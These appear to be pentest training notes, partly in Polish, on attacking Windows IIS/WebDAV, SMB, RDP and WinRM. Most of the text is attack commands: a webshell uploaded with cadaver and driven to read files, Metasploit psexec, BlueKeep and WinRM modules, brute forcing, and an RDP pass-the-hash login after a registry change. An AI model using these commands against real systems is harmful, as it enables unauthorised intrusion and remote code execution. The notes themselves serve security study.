# Frequently exploited Windows vulnerabilities

|                                                 |                                                           |                                                                                                                                                                                |
| ----------------------------------------------- | --------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Microsoft IIS (Internet Information Services)   | TCP ports<br>80/443                                      | Proprietary web server software developed by Microsoft that runs on Windows.                                                                                                   |
| WebDAV (Web Distributed Authoring & Versioning) | TCP ports<br> 80/443                                      | HTTP extension that allows clients to update, delete, move and copy files on a web server. WebDAV is used to enable a web server to act as a file server.                      |
| SMB/CIFS (Server Message Block Protocol)        | TCP port<br> 445                                          | (czasem oparty na protokole NetBIOS) Network file sharing protocol that is used to facilitate the sharing of files and peripherals between computers on a local network (LAN). |
| RDP(Remote Desktop Protocol)                    | TCP port<br> (zazwyczaj)3389,<br>często zmieniany na inny | Proprietary GUI remote access protocol developed by Microsoft and is used to remotely authenticate and interact with a Windows system.                                         |
| WinRM (Windows Remote Management Protocol)      | TCP ports<br> 5985(HTTP)<br>5986(HTTPS)                   | Windows remote management protocol that can be used to facilitate remote access with Windows systems. (Execute commands on remote machine)                                     |

## IIS - WebDAV (T:80/443)

Sprawdzić nagłówkiem `HTTP OPTION` jakie opcje są dostępne 
Supported executable file extensions: `.asp`, `.aspx`, `.config`, `.php`
### $ hydra

![[hydra#Http-get (WebDAV)]]
### $ davtest

Davtest is a WebDAV scanner that sends exploit files to the WebDAV server and automatically creates the directory and uploads different format types of files. The tool also tried to execute uploaded files and gives us an output of successfully executed files.

```bash
$ davtest -url http://10.0.16.177/webdav
$ davtest -auth bob:password_123321 -url http://10.0.16.177/webdav
```

### $ cadaver

Cadaver is a tool for WebDAV clients, which supports a command-line style interface. It supports operations such as uploading files, editing, moving, etc.

```bash
$ cadaver
> open http://target/webdav
 username: ...
 password: ...
> put /usr/share/webshells/asp/webshell.asp # wgranie webshella na server
# otworzyć webshell w przeglądarce

http://target/webdav/webshell.asp?cmd=whoam
http://target/webdav/webshell.asp?cmd=dir+C%3A%5C
http://target/webdav/webshell.asp?cmd=type+C%3A%5Cflag.txt
```

### $ msf

```bash
use exploit/windows/iis/iis_webdav_upload_asp
setg PATH /webdav/metsploit.asp # pamiętać o zmianie ścieżki
```

## SMB (T:445)

### $ msf>psexec

```bash
exploit/windows/smb/psexec
```

This module uses a valid administrator username and password (or password hash) to execute an arbitrary payload.
**Pass-the-hash:**
![[Pass-the-hash#$ msf>psexec]]
### $    impacket-psexec
![[tools/impacket#psexec]]
## RDP (T:3389)

bardzo często port jest zmieniany na inny niż 3389

### $ msf>rdp_scanner

### $ msf>BlueKeep(vulnerability)

```bash
msfconsole
search bluekeep (jest skaner oraz samo skrypt RCE)
use bluekeep_rce
show targets
set target 2
```

### $ xfreerdp

```bash
$ hydra ...
# program do łączenia się poprzez RDP
$ xfreerdp /u:administrator /p:qwertyuiop /v:target:3333
$ xfreerdp /v:192.168.100.50 /u:mike /p:diamond +clipboard /dynamic-resolution
```

#### $ passthehash z xfreerdp
```powershell
# https://www.stationx.net/pass-the-hash-attack/

# zmienia Restricted Acces jeśli jest włączony
$ reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

# kali
$ xfreerdp /v:192.168.100.50 /u:Administrator /pth:5c4d59391f656d5958dab124ffeabc20 +clipboard /dynamic-resolutionz
```

## WinRM (HTTP:5985/HTTPS:5986)

### $ msf

```bash
# czy winrm jest włączony i jekie metody logowania
use auxiliary/scanner/winrm/winrm_auth_methods

# bruteforce winrm
use auxiliary/scanner/winrm/winrm_login

# Execute command on the target server
auxiliary/scanner/winrm/winrm_cmd

# exploit na meterpreter
exploit/windows/winrm/winrm_script_exec
```

### $ crackmapexec
![[crackmapexec#WinRM (T 5985/5986)]]

### $ evil-winrm

![[tools/evil-winrm#Windows Remote Management shell for pentesting.]]

### $ msf>winrm_auth_methods

This is very important to know, before we try to connect to the WinRM service. We need to use
a valid authentication method while connecting to the service

```bash
use auxiliary/scanner/winrm/winrm_auth_methods
```

### $ msf>winrm_cmd

This module runs arbitrary Windows commands using the WinRM Service

```bash
use auxiliary/scanner/winrm/winrm_cmd
...
set CMD whoami
```

### $ msf>winrm_script_exec

sesja meterpreter

```bash
use exploit/windows/winrm/winrm_script_exec
...
set FORCE_VBS true
```
